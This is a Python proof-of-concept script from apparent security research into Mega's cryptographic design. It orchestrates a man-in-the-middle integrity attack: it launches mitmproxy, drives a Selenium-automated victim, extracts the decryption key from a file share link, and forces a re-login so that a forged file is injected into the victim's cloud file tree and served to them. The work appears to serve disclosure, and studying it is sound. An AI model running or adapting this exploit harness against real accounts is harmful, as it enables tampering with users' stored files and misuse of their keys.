
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC for MitM framing attack using mitmproxy and a victim automated
# with a Selenium browser.
#

from time import sleep
from os.path import basename

from issue_04.integrity_attack import MegaIntegrityAttack

from shared.constants.victim import *
from shared.constants.mitmproxy import *
from shared.constants.mega_web import *
from shared.victim import *
from shared.mitmproxy import *


class PoCMitmIntegrityAttack:
    def __init__(self):
        print("# Initialize MitM Integrity Attack PoC")
        self.attack = MegaIntegrityAttack()

    def _get_key_from_file_share_link(self, link):
        return url_decode(link.split("#")[1])

    def run_attack(self):
        forged_fname = basename(FORGE_FILE_NAME)
        share_fname = basename(SHARE_FILE_NAME)

        print("## Starting MitM attack")

        print("### Starting mitmproxy")
        mitmproxy = Mitmproxy("issue_04/poc_mitmproxy.py")
        mitmproxy.start()

        print("### Starting the victim process")
        victim = Victim(VICTIM_UNAME, mitmproxy_addr=MITMPROXY_ADDR)

        print("### Sharing the file")
        victim.login()
        victim.wait_for_cloud()

        # Transfer share link to mitmproxy script
        share_link = victim.share_file(share_fname)
        with open(SHARE_LINK_LOCAL_FNAME, "w+") as fp:
            fp.write(share_link)

        victim.unshare_file(share_fname)

        # Happens in poc_mitimproxy
        print("### Forging file")

        print("### Re-login to re-fetch the file tree, where we inject the forged file")
        victim.logout(skip_recovery=True)
        victim.login()

        # happens in mitmproxy during login
        print("### Modifying the file tree")

        victim.wait_for_cloud()

        # Give humans time to see the new file
        sleep(2)

        victim.view_in_browser(forged_fname)

        # happens in mitmproxy after double clicking forged file
        print("### Serving the forged file")

        # Give human time to see the forged file
        sleep(5)

        if mitmproxy.wait() and mitmproxy.is_done():
            print("### Attack successful!")
        else:
            print("### Attack failed!")

        mitmproxy.exit()
        victim.exit()
